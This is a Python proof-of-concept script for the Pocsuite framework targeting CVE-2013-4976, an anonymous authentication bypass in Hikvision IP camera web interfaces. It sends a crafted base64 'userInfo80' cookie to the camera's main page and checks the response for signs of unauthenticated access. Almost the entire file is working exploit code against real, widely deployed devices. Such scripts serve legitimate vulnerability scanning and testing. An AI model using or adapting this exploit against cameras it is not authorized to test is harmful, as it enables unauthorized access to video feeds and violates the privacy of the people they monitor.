#!/usr/bin/python
# -*- coding: utf-8 -*-
import urlparse
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def check(uri):
    headers = {'User-Agent':'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}
    timeout = 5
    url = '{}/doc/page/main.asp'.format(uri)
    cookies= {'userInfo80':'YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3Nw=='}
    try:
        r = req.get(url,headers=headers,cookies=cookies,timeout=timeout)
        if 'playback.asp' in r.content and ' <div id="mainFrame">' in r.content:
            return True,url
    except req.exceptions.ConnectionError:
        return False,'ConnectionError'
    except req.exceptions.ReadTimeout:
        return False,'ReadTimeout'
    except Exception as e:
        return False,str(e)

class TestPOC(POCBase):
    name = 'Hikonvision camara Anonymous User Authentication Bypass'
    vulID = '0'
    author = ['hancool']
    vulType = 'login-bypass'
    version = '1.0'    # default version: 1.0
    references = ['']
    desc = '''Hikonvision camara Anonymous User Authentication Bypass
           CVE-2013-4976'''
    vulDate = '2013-07-29'
    createDate = '2018-12-21'
    updateDate = '2018-12-21'
    appName = 'Hikonvision web'
    appVersion = 'All'
    appPowerLink = ''
    samples = ['']


    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify mode"""
        result = {}
        pr = urlparse.urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [80]
        for port in ports:
            uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
            status,msg = check(uri)
            if status:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname,port)
                break
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register(TestPOC)
